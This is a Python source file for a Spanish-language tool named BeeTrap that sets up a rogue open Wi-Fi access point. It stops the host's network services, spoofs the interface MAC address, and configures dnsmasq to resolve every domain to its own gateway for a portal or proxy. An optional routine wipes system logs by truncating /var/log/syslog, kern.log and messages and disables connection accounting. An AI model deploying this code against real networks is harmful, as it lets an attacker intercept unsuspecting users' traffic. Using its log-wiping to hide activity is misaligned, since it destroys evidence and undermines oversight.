import os
import sys
import time
import random
import re
import subprocess
import shutil


HOSTAPD_CONF = "/tmp/beetrap_hostapd.conf"
DNSMASQ_CONF = "/tmp/beetrap_dnsmasq.conf"
DNSMASQ_LEASES = "/tmp/beetrap_dnsmasq.leases"
GATEWAY = "10.0.66.1"
DHCP_RANGE_START = "10.0.66.10"
DHCP_RANGE_END = "10.0.66.250"


def random_mac():
    return "02:%s" % ":".join(
        "%02x" % random.randint(0, 255) for _ in range(5)
    )


def _run(cmd, check=True):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if check and result.returncode != 0:
        print(f"  [!] fallo: {cmd}")
        print(f"  [!] {result.stderr.strip()}")
    return result


def es_root():
    if os.geteuid() != 0:
        print()
        print("BeeTrap necesita permisos de root para:")
        print("  - crear un punto de acceso (hostapd)")
        print("  - modificar iptables")
        print("  - cambiar MAC de la interfaz WiFi")
        print()
        print("Ejecutar con: sudo beetrap")
        print()
        sys.exit(1)


def _dependencias():
    needed = ["hostapd", "dnsmasq", "iptables", "iw"]
    missing = []
    for cmd in needed:
        if not shutil.which(cmd):
            missing.append(cmd)
    if missing:
        print()
        print("Faltan dependencias: " + ", ".join(missing))
        print("Instalar con: apt install " + " ".join(missing))
        print()
        sys.exit(1)


def interfaz_soporta_ap(iface):
    result = _run(f"iw dev {iface} info", check=False)
    if result.returncode != 0:
        print(f"La interfaz '{iface}' no existe o no es WiFi")
        sys.exit(1)
    result = _run("iw list | grep 'AP' ", check=False)
    if "AP" not in result.stdout:
        print(f"La interfaz '{iface}' no soporta modo AP")
        sys.exit(1)


def _escribir_hostapd(iface, ssid):
    with open(HOSTAPD_CONF, "w") as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
channel=6
hw_mode=g
ignore_broadcast_ssid=0
auth_algs=1
wmm_enabled=1
""")


def _escribir_dnsmasq(iface, gateway=None, start=None, end=None, lease="12h", vendor=None, portal_host=None):
    gw = gateway or GATEWAY
    rstart = start or DHCP_RANGE_START
    rend = end or DHCP_RANGE_END
    vendor_line = ""
    if vendor:
        vendor_line = f"\ndhcp-option=60,{vendor}"
    portal_line = ""
    if portal_host:
        portal_line = f"\naddress=/{portal_host}/{gw}"
    with open(DNSMASQ_CONF, "w") as f:
        f.write(f"""interface={iface}
dhcp-range={rstart},{rend},255.255.255.0,{lease}
dhcp-option=3,{gw}
dhcp-option=6,{gw}
address=/#/{gw}
listen-address={gw}
bind-dynamic
dhcp-authoritative{vendor_line}{portal_line}
""")


class AccessPoint:
    def __init__(self, iface, ssid, proxy_port, cambiar_mac=False, deshabilitar_logs=False,
                 subnet=None, dhcp_lease="12h", dhcp_vendor=None):
        self.iface = iface
        self.ssid = ssid
        self.proxy_port = proxy_port
        self.cambiar_mac = cambiar_mac
        self.deshabilitar_logs = deshabilitar_logs
        self.subnet = subnet  # dict con keys: net, gw, start, end
        self.dhcp_lease = dhcp_lease
        self.dhcp_vendor = dhcp_vendor
        self.portal_host = None
        self.mac_original = None
        self.hostapd = None
        self.dnsmasq = None

    def _gw(self):
        if self.subnet:
            return self.subnet["gw"]
        return GATEWAY

    def _start(self):
        if self.subnet:
            return self.subnet["start"]
        return DHCP_RANGE_START

    def _end(self):
        if self.subnet:
            return self.subnet["end"]
        return DHCP_RANGE_END

    def _red(self):
        if self.subnet:
            return self.subnet["net"]
        return "10.0.66"

    def preparar(self):
        _dependencias()
        interfaz_soporta_ap(self.iface)

        _run("systemctl stop NetworkManager", check=False)
        _run("systemctl stop wpa_supplicant", check=False)
        _run("killall wpa_supplicant 2>/dev/null", check=False)
        _run("killall dhclient 2>/dev/null", check=False)
        _run("killall dnsmasq 2>/dev/null", check=False)
        time.sleep(2)

        # Eliminar interfaces P2P que puedan interferir con modo AP
        p2p = _run("iw dev | grep -B1 'type P2P-device' | grep Interface | awk '{print $2}'", check=False)
        for p in p2p.stdout.strip().split():
            if p:
                _run(f"iw dev {p} del", check=False)

        if self.cambiar_mac:
            self._cambiar_mac()

        if self.deshabilitar_logs:
            self._deshabilitar_logging()

        _run(f"ip link set {self.iface} down")
        time.sleep(1)
        _run(f"ip addr flush dev {self.iface}")

    def _cambiar_mac(self):
        result = _run(f"ip link show {self.iface}", check=False)
        match = re.search(r"link/ether\s+([\w:]+)", result.stdout)
        if match:
            self.mac_original = match.group(1)
            print(f"  MAC original: {self.mac_original}")
        _run(f"ip link set {self.iface} down")
        nueva = random_mac()
        _run(f"ip link set {self.iface} address {nueva}")
        _run(f"ip link set {self.iface} up")
        print(f"  MAC nueva: {nueva}")

    def _deshabilitar_logging(self):
        _run("sysctl -w net.netfilter.nf_conntrack_acct=0", check=False)
        logs = ["/var/log/syslog", "/var/log/kern.log", "/var/log/messages"]
        for lf in logs:
            if os.path.exists(lf):
                _run(f"truncate -s 0 {lf}", check=False)

    def iniciar(self):
        _escribir_hostapd(self.iface, self.ssid)
        gw = self._gw()
        _escribir_dnsmasq(self.iface, gateway=gw, start=self._start(),
                          end=self._end(), lease=self.dhcp_lease,
                          portal_host=self.portal_host)

        print(f"\n  hostapd en {self.iface}...")
        self.hostapd = subprocess.Popen(
            ["hostapd", "-d", HOSTAPD_CONF],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        time.sleep(4)

        if self.hostapd.poll() is not None:
            out = self.hostapd.stdout.read().decode()
            print(f"hostapd fallo:\n{out[-1500:]}")
            raise RuntimeError("hostapd no arranco")

        _run(f"ip addr add {gw}/24 dev {self.iface}")
        time.sleep(1)

        for intento in range(3):
            res = _run(f"ip addr show {self.iface}", check=False)
            if gw in res.stdout:
                break
            if intento < 2:
                _run(f"ip addr flush dev {self.iface}")
                _run(f"ip addr add {gw}/24 dev {self.iface}")
                time.sleep(1)
        else:
            raise RuntimeError(f"no se pudo asignar {gw}")

        self.dnsmasq = subprocess.Popen(
            ["dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        time.sleep(2)

        if self.dnsmasq.poll() is not None:
            out = self.dnsmasq.stdout.read().decode()
            print(f"dnsmasq fallo:\n{out[-1000:]}")
            raise RuntimeError("dnsmasq no arranco")

    def clientes_conectados(self):
        clientes = []
        if os.path.exists(DNSMASQ_LEASES):
            with open(DNSMASQ_LEASES) as f:
                for linea in f:
                    parts = linea.strip().split()
                    if len(parts) >= 4:
                        clientes.append({
                            "ip": parts[2],
                            "mac": parts[1],
                            "hostname": parts[3] if len(parts) > 3 else "desconocido",
                        })
        return clientes

    def detener(self):
        if self.hostapd:
            self.hostapd.terminate()
            try:
                self.hostapd.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.hostapd.kill()
        if self.dnsmasq:
            self.dnsmasq.terminate()
            try:
                self.dnsmasq.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.dnsmasq.kill()
        for f in [HOSTAPD_CONF, DNSMASQ_CONF, DNSMASQ_LEASES]:
            if os.path.exists(f):
                os.remove(f)

    def restaurar_interfaz(self):
        _run(f"ip link set {self.iface} down", check=False)
        _run(f"ip addr flush dev {self.iface}", check=False)
        _run(f"iw dev {self.iface} set type managed", check=False)
        _run(f"ip link set {self.iface} up", check=False)
        _run("systemctl start NetworkManager", check=False)
        _run("systemctl start wpa_supplicant", check=False)
        time.sleep(2)

    def restaurar_mac(self):
        if self.mac_original:
            _run(f"ip link set {self.iface} address {self.mac_original}", check=False)
